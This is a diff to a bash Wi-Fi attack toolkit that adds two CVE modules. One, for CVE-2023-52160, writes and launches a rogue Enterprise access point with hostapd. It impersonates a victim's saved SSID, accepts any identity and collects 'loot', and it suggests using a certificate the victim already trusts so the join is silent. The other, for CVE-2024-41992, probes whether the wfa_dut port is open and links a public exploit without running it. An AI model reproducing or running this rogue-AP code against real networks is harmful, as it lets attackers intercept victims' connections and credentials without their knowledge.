@@ -849,6 +849,160 @@ wifi_cve_run_dragonblood() {
     esac
 }
 
+# ── CVE-2023-52160 — wpa_supplicant PEAP authentication bypass ───────
+# The victim's client auto-connects to an attacker clone of a trusted
+# Enterprise network with no password and no interaction. The flaw is
+# that a reply of EAP-TLV Success is accepted instead of starting
+# Phase 2, so mutual authentication is skipped. Affects Android's
+# default Wi-Fi client, ChromeOS and most Linux.
+#
+# Precondition: the client does not validate the RADIUS certificate,
+# which is the documented default misconfiguration on those platforms.
+# Against a client that does validate, this produces nothing.
+wifi_cve_52160_peap_bypass() {
+    wifi_cve_require_iface || return 1
+
+    local ssid="${WIFI_CVE_SSID:-}"
+    if [[ -z "$ssid" ]]; then
+        err "set WIFI_CVE_SSID to the Enterprise network the victim has saved"
+        info "e.g. WIFI_CVE_SSID=CorpNet $0 --run-cve CVE-2023-52160"
+        info "the client auto-connects to a saved Enterprise SSID, so this must"
+        info "match one it already knows — a name it has never seen will not be joined"
+        return 1
+    fi
+
+    banner
+    cat << 'PL'
+  CVE-2023-52160 — wpa_supplicant PEAP authentication bypass
+  ---------------------------------------------------------
+  present a rogue Enterprise network with the victim's saved SSID.
+  the client authenticates believing it reached the real RADIUS; a
+  reply of EAP-TLV Success instead of starting Phase 2 is accepted,
+  skipping mutual authentication.
+
+  no password and no user interaction are needed. precondition: the
+  client does not validate the RADIUS certificate.
+PL
+    wifi_cve_confirm "present a rogue Enterprise AP claiming SSID '$ssid'" || return 1
+
+    mkdir -p "$WIFI_CVE_LOOT"
+    local conf="$WIFI_CVE_LOOT/peap_52160_$(date +%s).conf"
+    local users="$WIFI_CVE_LOOT/peap_52160_eap_users"
+    local dir="$WIFI_CVE_LOOT/peap_52160_certs"
+    mkdir -p "$dir"
+
+    # eap_user_file accepting any identity: the attack does not need a
+    # valid credential, which is the entire point of the bypass.
+    cat > "$users" <<'USERS'
+* PEAP,TTLS,TLS,FAST
+"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "t" [2]
+USERS
+
+    cat > "$conf" <<CONF
+# Rogue Enterprise AP for CVE-2023-52160.
+interface=$WIFI_IFACE
+driver=nl80211
+ssid=$ssid
+hw_mode=g
+channel=${TARGET_CHANNEL:-6}
+auth_algs=1
+wpa=2
+wpa_key_mgmt=WPA-EAP
+ieee8021x=1
+eap_server=1
+eap_user_file=$users
+ca_cert=$dir/ca.pem
+server_cert=$dir/server.pem
+private_key=$dir/server.key
+CONF
+
+    info "config: $conf"
+    info "eap users: $users"
+
+    # The certs are the operator's choice: pointing these at a CA the
+    # victim already trusts is what makes the join silent.
+    if [[ ! -f "$dir/server.pem" ]]; then
+        warn "no certificate at $dir/server.pem — hostapd will not start without one"
+        info "generate a self-signed pair, or point these paths at a cert the"
+        info "client already trusts; the latter is what makes the join silent"
+        printf 'CMD\topenssl req -x509 -newkey rsa:2048 -nodes -days 365 \\\n'
+        printf 'CMD\t  -keyout %s/server.key -out %s/server.pem -subj "/CN=%s"\n' "$dir" "$dir" "$ssid"
+        printf 'RESULT\tconfig written, hostapd not started — certificate paths need attention first\n'
+        return 0
+    fi
+
+    wifi_cve_dep_check hostapd || return 1
+    printf 'CMD\thostapd %s\n' "$conf"
+    timeout "${WIFI_CVE_DURATION:-60}" hostapd "$conf" 2>&1 | tail -20
+    printf 'EXIT\t%s\n' "$?"
+    printf 'RESULT\thostapd ran; whether the victim joined and its traffic was captured is for you to confirm\n'
+    info "loot: $WIFI_CVE_LOOT"
+    return 0
+}
+
+# ── CVE-2024-41992 — Wi-Fi Alliance wfa_dut command injection ────────
+# Unauthenticated root RCE on an access point running the Wi-Fi Test
+# Suite, plus a persistent dropbear backdoor.
+#
+# NVD describes this as reachable "via 802.11x frames", which is wrong:
+# it is a TCP TLV injection on ports 8000 and 8080. No radio is needed,
+# only a host that can reach the port. This probe corrects that, because
+# the CVE text would otherwise send an operator looking for a radio they
+# do not need — and would make them think an unreachable port means safe.
+wifi_cve_41992_wfa_dut() {
+    local host="${WIFI_CVE_HOST:-}"
+    local port="${WIFI_CVE_PORT:-8000}"
+
+    if [[ -z "$host" ]]; then
+        err "set WIFI_CVE_HOST to the access point's address"
+        info "e.g. WIFI_CVE_HOST=192.168.1.1 $0 --run-cve CVE-2024-41992"
+        return 1
+    fi
+
+    banner
+    cat << 'PL'
+  CVE-2024-41992 — Wi-Fi Alliance wfa_dut command injection
+  ---------------------------------------------------------
+  unauthenticated root code execution on an AP running the Wi-Fi Test
+  Suite, plus a persistent dropbear SSH backdoor.
+
+  NVD says this is reachable "via 802.11x frames". that is wrong: it is
+  a TCP TLV injection on ports 8000 and 8080. no radio is involved, and
+  a host on the LAN is enough.
+PL
+    wifi_cve_confirm "probe $host:$port for the wfa_dut service" || return 1
+
+    mkdir -p "$WIFI_CVE_LOOT"
+    local out="$WIFI_CVE_LOOT/wfa_dut_$(date +%s).txt"
+
+    # Reachability only. Sending the injection would hand over root, and
+    # that is not something a probe should do without being asked.
+    local state="closed"
+    timeout 3 bash -c "exec 3<>/dev/tcp/$host/$port" 2>/dev/null && state="open"
+
+    {
+        echo "cve: CVE-2024-41992"
+        echo "host: $host"
+        echo "port: $port"
+        echo "state: $state"
+        echo "note: TCP TLV injection, not an 802.11 frame. No radio needed."
+        echo "ts: $(date -Is)"
+    } | tee "$out"
+
+    if [[ "$state" == "open" ]]; then
+        warn "$host:$port is open — a wfa_dut service may be listening"
+        info "the public PoC is at https://github.com/fj016/CVE-2024-41992-PoC"
+        info "exploiting it yields unauthenticated root and installs a dropbear"
+        info "backdoor. That is not a reversible action, so it is not run from here."
+        printf 'RESULT\treachable — exploitation left to the operator deliberately\n'
+    else
+        printf 'RESULT\tnothing listening on %s:%s from here\n' "$host" "$port"
+        info "also try port 8080; the Wi-Fi Test Suite uses both"
+    fi
+    info "note: $out"
+    return 0
+}
+
 wifi_cve_run() {
     local id="${1:-}"
     if [[ -z "$id" ]]; then
@@ -882,6 +1036,8 @@ wifi_cve_run() {
             wifi_cve_run_handoff "$id" "WPA3→WPA2 transition downgrade — use hostapd-mana downgrade in module 04 (evil twin)" ;;
         CVE-2022-47522)
             wifi_cve_run_handoff "$id" "needs a victim client MAC — lock a client in recon and run the full MacStealer flow from the menu" ;;
+        CVE-2023-52160) wifi_cve_52160_peap_bypass ;;
+        CVE-2024-41992) wifi_cve_41992_wfa_dut ;;
         CVE-2023-52424)
             wifi_cve_run_handoff "$id" "SSID Confusion — use hostapd-mana (module 04) to advertise the trusted network" ;;
         CVE-2023-24023)
